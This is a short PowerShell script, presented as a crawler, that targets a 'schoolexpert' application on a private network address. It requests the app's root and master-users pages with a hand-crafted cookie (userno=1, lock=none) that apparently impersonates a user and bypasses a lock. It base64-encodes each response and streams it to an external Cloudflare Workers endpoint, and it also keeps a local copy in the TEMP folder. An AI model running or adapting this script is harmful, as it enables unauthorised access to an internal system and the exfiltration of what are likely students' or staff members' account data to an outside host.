# --- Configuration ---
$BaseUrl    = "http://192.168.29.20"
$WorkerUrl  = "https://wispy-sunset-a7c0.anox.workers.dev/cskm"
$UserAgent  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
$Cookie     = "fy=2025; userno=1; lock=none; usernoT=; fyT=;"
$LogFile    = Join-Path $env:TEMP "crawl_results_$(Get-Date -Format 'yyyyMMdd_HHmm').json"

$Paths = @(
    "/",
    "/schoolexpert",
    "/schoolexpert/mstrUsers.php",
    "/schoolexpert/mstrUsers.asp"
)

$Headers = @{
    "User-Agent" = $UserAgent
    "Cookie"     = $Cookie
}

# Container for all results
$AllResults = @()

Write-Host "Starting Crawl: $BaseUrl" -ForegroundColor Cyan

foreach ($Path in $Paths) {
    $FullUrl = "$BaseUrl$Path"
    
    $Entry = [ordered]@{
        url         = $FullUrl
        timestamp   = (Get-Date).ToString("o")
        status_code = 0
        success     = $false
        base64_body = ""
        error       = ""
    }

    try {
        $Response = Invoke-WebRequest -Uri $FullUrl -Headers $Headers -Method Get -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
        
        $Entry.status_code = [int]$Response.StatusCode
        $Entry.success     = $true
        
        # Encode HTML content to Base64
        $Bytes            = [System.Text.Encoding]::UTF8.GetBytes($Response.Content)
        $Entry.base64_body = [Convert]::ToBase64String($Bytes)
        
        Write-Host "OK: $Path" -ForegroundColor Green
    } catch {
        $Entry.success = $false
        $Entry.error   = $_.Exception.Message
        if ($_.Exception.Response) {
            $Entry.status_code = [int]$_.Exception.Response.StatusCode
        }
        Write-Host "FAIL: $Path" -ForegroundColor Red
    }

    $AllResults += $Entry

    # Post individual result to Worker immediately (Stream mode)
    try {
        $JsonEntry = $Entry | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $WorkerUrl -Method Post -Body $JsonEntry -ContentType "application/json"
    } catch {
        Write-Host "Worker Post Failed for $Path" -ForegroundColor Yellow
    }
}

# Write all results to the single local JSON file
$AllResults | ConvertTo-Json -Depth 10 | Set-Content -Path $LogFile

Write-Host "`nComplete." -ForegroundColor Cyan
Write-Host "Local Log: $LogFile"
